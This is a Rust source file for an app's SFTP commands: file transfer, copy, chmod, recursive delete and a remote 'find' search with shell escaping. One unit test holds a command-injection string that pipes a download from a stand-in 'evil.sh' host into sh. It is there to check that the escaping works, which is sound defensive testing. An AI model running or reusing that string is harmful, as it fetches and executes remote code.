use crate::commands::ssh::connections::SshStore;
use crate::commands::ssh::session::{SftpHandle, SshSessionManager};
use base64::{engine::general_purpose, Engine as _};
use russh_sftp::client::SftpSession;
use russh_sftp::protocol::FileAttributes;
use serde::Serialize;
use std::sync::Arc;

/// 单次读取上限（8 MiB）：防止前端误传超大 length 撑爆内存
const MAX_READ_LEN: usize = 8 * 1024 * 1024;

/// 本地写入分块上限（base64 解码后）
const MAX_LOCAL_CHUNK: usize = 8 * 1024 * 1024;

/// 将 SFTP 下载的一个分块写入本地文件（替代前端 plugin-fs writeFile 直调）。
/// `append=false` 时截断文件（首块），`append=true` 时追加（后续块）。
#[tauri::command]
pub async fn sftp_write_local_chunk(
    path: String,
    data_b64: String,
    append: bool,
) -> Result<u64, String> {
    let p = crate::utils::path_guard::validate_abs_sane_path(&path)?;
    if data_b64.len() > MAX_LOCAL_CHUNK * 4 / 3 + 4 {
        return Err(format!("Chunk too large (> {MAX_LOCAL_CHUNK} bytes)"));
    }
    let bytes = tokio::task::spawn_blocking(move || {
        general_purpose::STANDARD
            .decode(&data_b64)
            .map_err(|e| format!("BAD_B64: {e}"))
    })
    .await
    .map_err(|e| format!("JOIN: {e}"))??;
    if bytes.len() > MAX_LOCAL_CHUNK {
        return Err(format!("Chunk too large (> {MAX_LOCAL_CHUNK} bytes)"));
    }

    let written = {
        let path_display = p.display().to_string();
        tokio::task::spawn_blocking(move || -> std::io::Result<u64> {
            let mut opts = std::fs::OpenOptions::new();
            opts.create(true).write(true);
            if append {
                opts.append(true);
            } else {
                opts.truncate(true);
            }
            use std::io::Write;
            let mut f = opts.open(&p)?;
            f.write_all(&bytes)?;
            Ok(bytes.len() as u64)
        })
        .await
        .map_err(|e| format!("JOIN: {e}"))?
        .map_err(|e| format!("LOCAL_WRITE {path_display}: {e}"))?
    };
    Ok(written)
}

#[derive(Serialize)]
pub struct SftpEntry {
    pub name: String,
    pub is_dir: bool,
    pub size: u64,
    pub mode: u32,
    pub mtime: i64,
}

fn meta_to_entry(name: &str, meta: &russh_sftp::protocol::FileAttributes) -> SftpEntry {
    SftpEntry {
        name: name.to_string(),
        is_dir: meta.is_dir(),
        size: meta.size.unwrap_or(0),
        mode: meta.permissions.unwrap_or(0),
        mtime: meta.mtime.unwrap_or(0) as i64,
    }
}

#[tauri::command]
pub async fn ssh_sftp_open(
    app: tauri::AppHandle,
    store: tauri::State<'_, SshStore>,
    manager: tauri::State<'_, SshSessionManager>,
    connection_id: String,
) -> Result<String, String> {
    // 复用已存在的连接会话；否则新建（与 terminal.rs 相同，并发打开由 open_locks 去重）
    let entry = manager.get_or_open(&app, &store, &connection_id).await?;
    let client = entry.client.lock().await;
    let channel = client
        .channel_open_session()
        .await
        .map_err(|e| format!("OPEN_FAILED: {e}"))?;
    channel
        .request_subsystem(true, "sftp")
        .await
        .map_err(|e| format!("SFTP_SUBSYSTEM_FAILED: {e}"))?;
    let sftp = SftpSession::new(channel.into_stream())
        .await
        .map_err(|e| format!("SFTP_INIT_FAILED: {e}"))?;

    let sftp_id = uuid::Uuid::new_v4().to_string();
    entry.sftp_sessions.lock().await.insert(
        sftp_id.clone(),
        Arc::new(SftpHandle {
            sftp: tokio::sync::Mutex::new(sftp),
        }),
    );
    Ok(sftp_id)
}

/// 关闭单个 SFTP 通道（不影响 SSH 会话本身，同连接的终端继续可用）
#[tauri::command]
pub async fn ssh_sftp_close(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
) -> Result<(), String> {
    if manager.remove_sftp(&sftp_id).await {
        Ok(())
    } else {
        Err(format!("NO_SFTP: {sftp_id}"))
    }
}

#[tauri::command]
pub async fn ssh_sftp_list_dir(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    path: String,
) -> Result<Vec<SftpEntry>, String> {
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let sftp = h.sftp.lock().await;
    let mut out = Vec::new();
    for f in sftp
        .read_dir(&path)
        .await
        .map_err(|e| format!("SFTP_LIST: {e}"))?
    {
        out.push(meta_to_entry(&f.file_name(), &f.metadata()));
    }
    out.sort_by(|a, b| {
        (b.is_dir as u8)
            .cmp(&(a.is_dir as u8))
            .then(a.name.cmp(&b.name))
    });
    Ok(out)
}

#[tauri::command]
pub async fn ssh_sftp_read_file(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    path: String,
    offset: u64,
    length: usize,
) -> Result<String, String> {
    use tokio::io::{AsyncReadExt, AsyncSeekExt};
    if length == 0 || length > MAX_READ_LEN {
        return Err(format!("INVALID_LENGTH: must be in 1..={}", MAX_READ_LEN));
    }
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let sftp = h.sftp.lock().await;
    let mut file = sftp
        .open(&path)
        .await
        .map_err(|e| format!("SFTP_OPEN: {e}"))?;
    if offset > 0 {
        file.seek(tokio::io::SeekFrom::Start(offset))
            .await
            .map_err(|e| format!("SFTP_SEEK: {e}"))?;
    }
    let mut buf = vec![0u8; length];
    let n = file
        .read(&mut buf)
        .await
        .map_err(|e| format!("SFTP_READ: {e}"))?;
    buf.truncate(n);
    Ok(general_purpose::STANDARD.encode(&buf))
}

#[tauri::command]
pub async fn ssh_sftp_write_file(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    path: String,
    data: String,
    offset: u64,
) -> Result<(), String> {
    use tokio::io::{AsyncSeekExt, AsyncWriteExt};
    let bytes = general_purpose::STANDARD
        .decode(data.as_bytes())
        .map_err(|e| format!("INVALID_B64: {e}"))?;
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let sftp = h.sftp.lock().await;
    // 首块（offset==0）截断已有内容，避免覆盖较短文件时残留旧尾部字节导致静默损坏；
    // 后续块仅在偏移处续写，不做截断。
    let flags = if offset == 0 {
        russh_sftp::protocol::OpenFlags::WRITE
            | russh_sftp::protocol::OpenFlags::CREATE
            | russh_sftp::protocol::OpenFlags::TRUNCATE
    } else {
        russh_sftp::protocol::OpenFlags::WRITE | russh_sftp::protocol::OpenFlags::CREATE
    };
    let mut file = sftp
        .open_with_flags(&path, flags)
        .await
        .map_err(|e| format!("SFTP_OPEN: {e}"))?;
    if offset > 0 {
        file.seek(tokio::io::SeekFrom::Start(offset))
            .await
            .map_err(|e| format!("SFTP_SEEK: {e}"))?;
    }
    file.write_all(&bytes)
        .await
        .map_err(|e| format!("SFTP_WRITE: {e}"))?;
    file.sync_all()
        .await
        .map_err(|e| format!("SFTP_SYNC: {e}"))?;
    Ok(())
}

#[tauri::command]
pub async fn ssh_sftp_mkdir(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    path: String,
) -> Result<(), String> {
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let sftp = h.sftp.lock().await;
    sftp.create_dir(&path)
        .await
        .map_err(|e| format!("SFTP_MKDIR: {e}"))
}

#[tauri::command]
pub async fn ssh_sftp_rename(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    from: String,
    to: String,
) -> Result<(), String> {
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let sftp = h.sftp.lock().await;
    sftp.rename(&from, &to)
        .await
        .map_err(|e| format!("SFTP_RENAME: {e}"))
}

#[tauri::command]
pub async fn ssh_sftp_delete(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    path: String,
    is_dir: bool,
) -> Result<(), String> {
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let sftp = h.sftp.lock().await;
    if is_dir {
        sftp.remove_dir(&path)
            .await
            .map_err(|e| format!("SFTP_RMDIR: {e}"))?;
    } else {
        sftp.remove_file(&path)
            .await
            .map_err(|e| format!("SFTP_RM: {e}"))?;
    }
    Ok(())
}

#[tauri::command]
pub async fn ssh_sftp_stat(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    path: String,
) -> Result<SftpEntry, String> {
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let meta = h
        .sftp
        .lock()
        .await
        .metadata(&path)
        .await
        .map_err(|e| format!("SFTP_STAT: {e}"))?;
    let name = std::path::Path::new(&path)
        .file_name()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or(path.clone());
    Ok(meta_to_entry(&name, &meta))
}

/// 修改远程文件/目录权限（chmod）。
/// `mode` 为八进制权限值（如 0o644 / 0o755）。
#[tauri::command]
pub async fn ssh_sftp_chmod(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    path: String,
    mode: u32,
) -> Result<(), String> {
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let sftp = h.sftp.lock().await;
    let attrs = FileAttributes {
        size: None,
        uid: None,
        user: None,
        gid: None,
        group: None,
        permissions: Some(mode & 0o7777),
        atime: None,
        mtime: None,
    };
    sftp.set_metadata(&path, attrs)
        .await
        .map_err(|e| format!("SFTP_CHMOD: {e}"))
}

/// 递归复制目录；文件则直接复制为单文件。
/// `from` 与 `to` 均为绝对路径。复制目录时目标不存在则自动创建。
#[tauri::command]
pub async fn ssh_sftp_copy_recursive(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    from: String,
    to: String,
    overwrite: bool,
) -> Result<u64, String> {
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let sftp = h.sftp.lock().await;
    copy_recursive_impl(&sftp, &from, &to, overwrite, 0).await
}

/// 复制单文件：读远端 → 写远端。
async fn copy_file(
    sftp: &SftpSession,
    from: &str,
    to: &str,
    overwrite: bool,
) -> Result<(), String> {
    if !overwrite && sftp.metadata(to).await.is_ok() {
        // 目标已存在且不覆盖时跳过
        return Ok(());
    }
    let mut src = sftp
        .open(from)
        .await
        .map_err(|e| format!("SFTP_COPY_OPEN_SRC: {e}"))?;
    let mut dst = sftp
        .open_with_flags(
            to,
            russh_sftp::protocol::OpenFlags::WRITE | russh_sftp::protocol::OpenFlags::CREATE,
        )
        .await
        .map_err(|e| format!("SFTP_COPY_OPEN_DST: {e}"))?;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut buf = vec![0u8; 128 * 1024];
    loop {
        let n = src
            .read(&mut buf)
            .await
            .map_err(|e| format!("SFTP_COPY_READ: {e}"))?;
        if n == 0 {
            break;
        }
        dst.write_all(&buf[..n])
            .await
            .map_err(|e| format!("SFTP_COPY_WRITE: {e}"))?;
    }
    dst.sync_all()
        .await
        .map_err(|e| format!("SFTP_COPY_SYNC: {e}"))?;
    Ok(())
}

async fn copy_recursive_impl(
    sftp: &SftpSession,
    from: &str,
    to: &str,
    overwrite: bool,
    depth: usize,
) -> Result<u64, String> {
    let meta = sftp
        .metadata(from)
        .await
        .map_err(|e| format!("SFTP_COPY_STAT_SRC: {e}"))?;
    if metadata_is_dir(&meta) {
        // 目录：确保目标存在
        if sftp.metadata(to).await.is_err() {
            sftp.create_dir(to)
                .await
                .map_err(|e| format!("SFTP_COPY_MKDIR: {e}"))?;
        }
        let entries = sftp
            .read_dir(from)
            .await
            .map_err(|e| format!("SFTP_COPY_READDIR: {e}"))?;
        let mut copied = 0u64;
        for e in entries {
            let name = e.file_name().to_string();
            if name == "." || name == ".." {
                continue;
            }
            let src = join_path(from, &name);
            let dst = join_path(to, &name);
            let child_meta = e.metadata().clone();
            // 用 child 的目录标记决定复制方式
            let total = if child_meta.is_dir() {
                Box::pin(copy_recursive_impl(sftp, &src, &dst, overwrite, depth + 1)).await?
            } else {
                copy_file(sftp, &src, &dst, overwrite).await?;
                1
            };
            copied += total;
        }
        if depth == 0 && copied == 0 {
            // 空目录也算复制成功
            return Ok(0);
        }
        Ok(copied)
    } else {
        copy_file(sftp, from, to, overwrite).await?;
        Ok(1)
    }
}

fn metadata_is_dir(meta: &FileAttributes) -> bool {
    meta.is_dir()
}

fn join_path(base: &str, name: &str) -> String {
    if base.ends_with('/') || base.is_empty() {
        format!("{base}{name}")
    } else {
        format!("{base}/{name}")
    }
}

/// 在远端执行 `find` 命令搜索文件（需要服务器支持 find，通常内置）。
/// 返回匹配项列表（相对搜索根路径的路径）。
#[tauri::command]
pub async fn ssh_sftp_search(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    root: String,
    pattern: String,
    max_depth: Option<u32>,
) -> Result<Vec<String>, String> {
    // 通过 SFTP 会话找到所属的 SSH session
    let entry = {
        let sessions = manager.sessions.lock().await;
        let mut found = None;
        for entry in sessions.values() {
            let sp = entry.sftp_sessions.lock().await;
            if sp.contains_key(&sftp_id) {
                found = Some(entry.clone());
                break;
            }
        }
        found
    }
    .ok_or("NO_SESSION_FOR_SFTP")?;

    let client = entry.client.lock().await;
    let ch = client
        .channel_open_session()
        .await
        .map_err(|e| format!("SFTP_SEARCH_OPEN: {e}"))?;

    let cmd = build_find_command(&root, &pattern, max_depth);

    ch.exec(true, cmd.into_bytes())
        .await
        .map_err(|e| format!("SFTP_SEARCH_EXEC: {e}"))?;

    let mut out = String::new();
    use russh::ChannelMsg;
    let mut buf_read = ch;
    loop {
        match buf_read.wait().await {
            Some(ChannelMsg::Data { data }) => {
                out.push_str(&String::from_utf8_lossy(&data));
            }
            Some(ChannelMsg::ExtendedData { data, .. }) => {
                out.push_str(&String::from_utf8_lossy(&data));
            }
            Some(ChannelMsg::Eof) | Some(ChannelMsg::Close) | None => break,
            _ => {}
        }
    }
    let lines: Vec<String> = out
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();
    Ok(lines)
}

/// 构造远端 find 命令。root 与 pattern 均需单引号转义，防止远端 shell 注入，
/// 同时让含空格的路径保持为单一参数。
fn build_find_command(root: &str, pattern: &str, max_depth: Option<u32>) -> String {
    let mut cmd = format!(
        "find '{}' -name '{}'",
        shell_escape(root),
        shell_escape(pattern)
    );
    if let Some(d) = max_depth {
        cmd.push_str(&format!(" -maxdepth {}", d));
    }
    cmd.push_str(" -not -path '*/.*' 2>/dev/null");
    cmd
}

fn shell_escape(s: &str) -> String {
    s.replace('\'', "'\\''")
}

/// 递归删除目录（含内容）。SFTP 标准协议无递归删除，这里逐项展开。
#[tauri::command]
pub async fn ssh_sftp_rm_recursive(
    manager: tauri::State<'_, SshSessionManager>,
    sftp_id: String,
    path: String,
) -> Result<(), String> {
    let h = manager
        .find_sftp(&sftp_id)
        .await
        .ok_or_else(|| format!("NO_SFTP: {sftp_id}"))?;
    let sftp = h.sftp.lock().await;
    rm_recursive_impl(&sftp, &path).await
}

async fn rm_recursive_impl(sftp: &SftpSession, path: &str) -> Result<(), String> {
    let meta = sftp
        .metadata(path)
        .await
        .map_err(|e| format!("SFTP_RM_STAT: {e}"))?;
    if metadata_is_dir(&meta) {
        let entries = sftp
            .read_dir(path)
            .await
            .map_err(|e| format!("SFTP_RM_READDIR: {e}"))?;
        for e in entries {
            let name = e.file_name().to_string();
            if name == "." || name == ".." {
                continue;
            }
            Box::pin(rm_recursive_impl(sftp, &join_path(path, &name))).await?;
        }
        sftp.remove_dir(path)
            .await
            .map_err(|e| format!("SFTP_RM_DIR: {e}"))?;
    } else {
        sftp.remove_file(path)
            .await
            .map_err(|e| format!("SFTP_RM_FILE: {e}"))?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_find_command_escapes_root_and_pattern() {
        let cmd = build_find_command("/var/log", "*.log", None);
        assert_eq!(
            cmd,
            "find '/var/log' -name '*.log' -not -path '*/.*' 2>/dev/null"
        );
    }

    #[test]
    fn test_build_find_command_escapes_malicious_root() {
        // root 必须被包在单引号参数里，分号/管道不能逃逸成 shell 语法
        let evil = "/tmp; curl evil.sh | sh; #";
        let cmd = build_find_command(evil, "x", None);
        assert!(cmd.starts_with("find '"), "root was not quoted: {cmd}");
        let first_arg_end = cmd.find("' -name").expect("quoted root arg");
        assert!(cmd[..first_arg_end].contains(evil));
    }

    #[test]
    fn test_build_find_command_escapes_pattern_quote() {
        let cmd = build_find_command("/tmp", "it's", None);
        assert!(cmd.contains("-name 'it'\\''s'"), "got: {cmd}");
    }

    #[test]
    fn test_build_find_command_max_depth() {
        let cmd = build_find_command("/tmp", "*.tmp", Some(3));
        assert!(cmd.contains(" -maxdepth 3"), "got: {cmd}");
    }

    #[test]
    fn test_build_find_command_root_with_spaces() {
        // 附带修复：带空格的路径此前会拆成多个参数
        let cmd = build_find_command("/home/u/My Files", "a", None);
        assert!(cmd.starts_with("find '/home/u/My Files'"), "got: {cmd}");
    }
}
